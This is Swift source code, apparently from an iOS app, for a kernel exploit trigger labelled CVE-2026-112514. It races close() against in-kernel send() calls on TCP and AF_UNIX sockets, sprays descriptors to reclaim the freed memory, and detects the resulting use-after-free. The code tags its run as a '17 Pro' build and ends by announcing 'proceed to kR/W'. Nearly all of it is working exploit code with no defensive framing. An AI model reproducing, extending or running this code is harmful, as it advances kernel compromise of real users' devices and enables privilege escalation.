    // One hammer-race: senders are already spinning, the closer fires at a
    // random point while they are in-kernel, then we spray and check.
    func sockUafRaceOnce(_ st: SockUafState, _ target: Int32, _ sprayCount: Int,
                         _ it: Int, _ tag: String) -> Bool {
        st.postCloseOk = 0
        st.odd = 0
        st.fd = target
        let closeBefore = st.closeSeen
        st.phase = 1
        // Keep the senders inside send() for a random slice, then close.
        usleep(UInt32.random(in: 30...600))
        st.phase = 2
        var spins = 0
        while st.phase != 3 && spins < 400_000 { spins &+= 1 }
        let afterCloseOk = st.postCloseOk   // successes before any spray reuse
        if st.closeSeen == closeBefore { close(target) }   // closer lost, do it here
        usleep(15)
        let spray = sockUafSpray(sprayCount)
        usleep(150)
        var corrupt = sockUafCheck(spray)
        // Extra oracle: a replaced slot used as a socket may answer
        // getsockname() with a bogus family.
        if !corrupt {
            for fd in spray {
                var addr = sockaddr_in()
                var al = socklen_t(MemoryLayout<sockaddr_in>.size)
                let r = withUnsafeMutablePointer(to: &addr) { p -> Int32 in
                    p.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                        getsockname(fd, sa, &al)
                    }
                }
                if r == 0 && addr.sin_family != sa_family_t(AF_INET) {
                    emit("[!] ITER \(it) \(tag): getsockname family=\(addr.sin_family) on spray fd")
                    corrupt = true
                    break
                }
            }
        }
        st.phase = 0
        st.fd = -1
        usleep(15)
        for fd in spray { close(fd) }
        if corrupt { emit("[!] ITER \(it) \(tag): *** CORRUPTION DETECTED ***") }
        if afterCloseOk > 0 {
            emit("[*] ITER \(it) \(tag): \(afterCloseOk) send(s) returned success after close()")
        }
        if st.odd > 0 {
            let e = st.lastErr
            emit("[?] ITER \(it) \(tag): \(st.odd) odd errno(s), last=\(e) (\(String(cString: strerror(e))))")
        }
        return corrupt
    }

    func runSocketUafMode() async {
        isRunning = true
        status = "Socket UAF..."
        log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== CVE-2026-112514 socket UAF trigger (17 Pro, hammer build) ===")
        signal(SIGPIPE, SIG_IGN)
        let ip = "127.0.0.1"
        let port = 8080
        let iterations = 40000
        let senderCount = 6

        // --- local loopback listener so connects reach ESTABLISHED ---
        let listenFd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
        var laddr = sockaddr_in()
        laddr.sin_family = sa_family_t(AF_INET)
        laddr.sin_port = in_port_t(UInt16(port).bigEndian)
        inet_pton(AF_INET, ip, &laddr.sin_addr)
        var yesVal: Int32 = 1
        setsockopt(listenFd, SOL_SOCKET, SO_REUSEADDR, &yesVal, socklen_t(MemoryLayout<Int32>.size))
        _ = withUnsafePointer(to: &laddr) { p in
            p.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                bind(listenFd, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
            }
        }
        listen(listenFd, 128)
        let heldLock = NSLock()
        var heldAccepted: [Int32] = []
        Thread.detachNewThread {
            while true {
                let c = accept(listenFd, nil, nil)
                if c < 0 { continue }
                // Hold a bounded number of peers open and never read them, so
                // their receive buffers stay queued and the target's send path
                // has to take the buffer-full branch.
                heldLock.lock()
                if heldAccepted.count >= 16 { close(heldAccepted.removeFirst()) }
                heldAccepted.append(c)
                heldLock.unlock()
            }
        }

        // --- persistent workers: created once, never torn down mid-run ---
        let st = SockUafState()
        let sendLen = 8192
        let sendBuf = UnsafeMutablePointer<UInt8>.allocate(capacity: sendLen)
        sendBuf.initialize(repeating: 0x41, count: sendLen)
        let sink = sendBuf
        let stRef = st
        for _ in 0..<senderCount {
            Thread.detachNewThread { self.sockUafSenderLoop(stRef, sink, sendLen) }
        }
        Thread.detachNewThread { self.sockUafCloserLoop(stRef) }

        var triggered = false
        let t0 = Date()
        var maxAfterClose = 0

        for it in 0..<iterations {
            if triggered { break }
            let r = it % 3
            if r == 0 {
                // ---- variant A: single TCP socket, close racing in-kernel sends ----
                let target = sockUafMakeSocket(ip, port)
                if target >= 0 {
                    triggered = sockUafRaceOnce(st, target, 192, it, "single")
                }
            } else if r == 1 {
                // ---- variant B: 8 sockets, close evens, race sends on one odd ----
                var fds: [Int32] = []
                for _ in 0..<8 {
                    let f = sockUafMakeSocket(ip, port)
                    if f >= 0 { fds.append(f) }
                }
                if fds.count >= 6 {
                    usleep(300)
                    var i = 0
                    while i < fds.count { close(fds[i]); fds[i] = -1; i += 2 }
                    triggered = sockUafRaceOnce(st, fds[1], 256, it, "multi")
                    i = 3
                    while i < fds.count { if fds[i] >= 0 { close(fds[i]) }; i += 2 }
                } else {
                    for f in fds { close(f) }
                }
            } else {
                // ---- variant C: AF_UNIX socketpair, close racing in-kernel sends ----
                var pair: [Int32] = [-1, -1]
                let pr = pair.withUnsafeMutableBufferPointer { buf -> Int32 in
                    socketpair(AF_UNIX, SOCK_STREAM, 0, buf.baseAddress)
                }
                if pr == 0 {
                    // small buffers: force the send path through the full-buffer
                    // branch instead of letting loopback drain instantly
                    var small: Int32 = 4096
                    setsockopt(pair[0], SOL_SOCKET, SO_SNDBUF, &small, socklen_t(MemoryLayout<Int32>.size))
                    setsockopt(pair[1], SOL_SOCKET, SO_RCVBUF, &small, socklen_t(MemoryLayout<Int32>.size))
                    triggered = sockUafRaceOnce(st, pair[0], 192, it, "unixpair")
                    if pair[1] >= 0 { close(pair[1]) }
                }
            }
            if st.postCloseOk > maxAfterClose { maxAfterClose = st.postCloseOk }

            if it % 100 == 0 && it > 0 {
                let secs = Date().timeIntervalSince(t0)
                emit(String(format: "[*] iter %d/%d  %.1f it/s  sends=%d  afterClose(max)=%d",
                            it, iterations, Double(it) / max(secs, 0.001), st.sends, maxAfterClose))
            }
        }

        st.stop = 1
        usleep(5000)
        emit(triggered ? "[+] socket UAF TRIGGERED — proceed to kR/W"
                       : "[-] race not won in \(iterations) iterations")
        status = "Complete"
        isRunning = false
    }
